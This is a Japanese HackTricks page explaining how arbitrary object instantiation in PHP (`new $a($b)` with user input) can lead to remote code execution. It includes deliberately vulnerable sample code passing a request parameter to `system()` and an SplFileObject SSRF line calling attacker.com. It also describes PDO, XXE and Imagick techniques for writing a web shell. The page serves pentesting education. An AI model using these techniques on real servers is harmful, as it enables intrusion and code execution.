# PHP - オブジェクト作成を悪用したRCE: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>

## はじめに

`new $_GET["a"]($_GET["a"])`のように任意の新しいオブジェクトを作成できる状況では、RCEを取得できる可能性があり、[**このライトアップ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ではRCEを取得するさまざまな方法を公開しています。

## カスタムクラスまたはオートローディングを介したRCE

`new $a($b)`の構造では、**変数`$a`は作成されるオブジェクトのクラス名**を表し、変数**`$b`はオブジェクトのコンストラクタに渡される最初の引数**を表します。

`$a`と`$b`がGET/POSTから来る場合、それらは**文字列または文字列の配列**になります。**JSON**や他の場所から来る場合、それらはオブジェクトやブール値など、**他のタイプを持つ可能性があります**。

次の例を考えてみましょう：
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
このコードでは、`$a`を`App`または`App2`に、`$b`を`uname -a`に設定できます。その後、コマンド`uname -a`が実行されます。

アプリケーションにそのような利用可能なクラスがない場合、または必要なクラスが脆弱なコードによってインクルードされていない別のファイルにある場合は、オートローディング関数を見てみると良いでしょう。

**オートローディング関数**は、`spl_autoload_register`を介してコールバックを登録するか、`__autoload`を定義することによって設定されます。未知のクラスのインスタンスが作成されようとしたときに呼び出されます。
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
PHPのバージョンやオートローディング関数内のコードによっては、オートローディングを介してリモートコード実行（RCE）を行う方法が存在する可能性があります。

## 組み込みクラスを利用したRCE

カスタムクラスやオートローディングがない場合、**PHPの組み込みクラスのみ**に依存することができます。

PHPには100から200の組み込みクラスがあります。その数はPHPのバージョンやインストールされている拡張機能によって異なります。`get_declared_classes` 関数を使用すると、カスタムクラスとともに、すべての組み込みクラスをリストすることができます。
```php
var_dump(get_declared_classes());
```
クラスには有用なコンストラクタがあり、[リフレクションAPI](https://www.php.net/manual/en/book.reflection.php)を通じて見つけることができます。

リフレクションAPIを使用してコンストラクタとそのパラメータを表示する：[https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

**複数のコンストラクタパラメータを制御し、その後任意のメソッドを呼び出すことができる場合**、リモートコード実行を得る方法は多数あります。しかし、**1つのパラメータのみを渡し、作成されたオブジェクトに対して呼び出しがない場合**、**ほとんど何も**ありません。

`new $a($b)`から何かを得る方法は3つしか知りません。

### **SSRF + Phar逆シリアライズ**

`SplFileObject`クラスは、任意のローカルまたはリモートURLに接続を許可するコンストラクタを実装しています：
```
new SplFileObject('http://attacker.com/');
```
これによりSSRFが可能になります。さらに、PHP < 8.0のSSRFは、Pharプロトコルを使用した技術によってデシリアライゼーションに変換することができました。

### **PDOの悪用**

PDOクラスにはもう一つ興味深いコンストラクタがあります：
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO` コンストラクタは DSN 文字列を受け入れ、**インストールされたデータベース拡張機能**を使用して**任意のローカルまたはリモートデータベースに接続**することができます。例えば、SQLite 拡張機能は空のファイルを作成することができます。

### **SoapClient/SimpleXMLElement XXE**

PHP ≤ 5.3.22 および ≤ 5.4.12 では、SoapClient のコンストラクタは **XXE に対して脆弱**でした。SimpleXMLElement のコンストラクタも XXE に対して脆弱でしたが、libxml2 < 2.9 が必要でした。

## Imagick 拡張機能を介した RCE

**プロジェクト**の**依存関係**をチェックすることで、新しいオブジェクトを作成して**コマンドを実行するために悪用できる新しいクラス**を見つけることができるかもしれません。この場合、**Imagick** はその目的に役立つことがわかりました。

### VID パーサー

VID パーサーは、ファイルシステム内の任意のパスに任意の内容を書き込むことができ、攻撃者がウェブページからアクセス可能なフォルダに PHPshell を書き込んで RCE を取得することを可能にします。

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID パーサー + ファイルアップロード

PHP にファイルがアップロードされると、一時的に `/tmp/phpXXXXXX` に保存されます。Imagick の VID パーサーは **msl** プロトコルを使用してファイルパスにワイルドカードを**指定することができ**（そのため、一時的にアップロードされたファイルに簡単にアクセスできます）、**任意の場所にコピーすることができます**。\
これはファイルシステム内で任意のファイル書き込みを得る別の方法です：

![](<../../../.gitbook/assets/image (159).png>)

### PHP クラッシュ + ブルートフォース

[**元のライトアップ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) は、特定の内容のファイルをアップロードして、サーバーがそのファイルを削除する前にクラッシュさせ、一時ファイルの名前をブルートフォースして、**Imagick が任意の PHP コードを実行する**までの別の方法を説明しました。

しかし、どうやら発見された**クラッシュのトリック**は**古いバージョンの ImageMagick**でのみ機能したようです。

## 参考文献

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWS ハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法：

* **HackTricks に広告を掲載したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見してください。私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションです。
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に**参加するか**、🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) で私に**フォローしてください**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有してください**。

</details>
